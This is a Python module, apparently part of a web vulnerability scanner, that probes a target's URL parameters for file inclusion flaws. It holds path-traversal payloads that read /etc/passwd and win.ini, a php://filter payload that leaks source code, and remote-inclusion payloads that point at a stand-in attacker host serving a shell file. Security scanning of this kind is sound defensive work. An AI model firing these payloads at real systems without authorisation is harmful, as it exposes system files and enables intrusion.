from typing import Optional
import aiohttp
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "file:///etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt?",
    "https://evil.com/phpinfo.php",
]


async def run(target: str, scan_id: Optional[int] = None) -> list[dict]:
    results = []
    url = f"https://{target}" if not target.startswith("http") else target
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        params = {"file": [""], "page": [""], "include": [""], "path": [""]}

    async with aiohttp.ClientSession() as session:
        for param, values in params.items():
            for payload in LFI_PAYLOADS:
                try:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_qs = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_qs))
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        text = await resp.text()
                        if "root:" in text or "[boot loader]" in text or "daemon:" in text:
                            results.append({
                                "finding_type": "LFI",
                                "severity": "critical",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": "Sensitive file content detected",
                            })
                            break
                except Exception:
                    pass

            for payload in RFI_PAYLOADS:
                try:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_qs = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_qs))
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        text = await resp.text()
                        if "phpinfo" in text.lower():
                            results.append({
                                "finding_type": "RFI",
                                "severity": "critical",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": "Remote file inclusion detected",
                            })
                            break
                except Exception:
                    pass
    return results
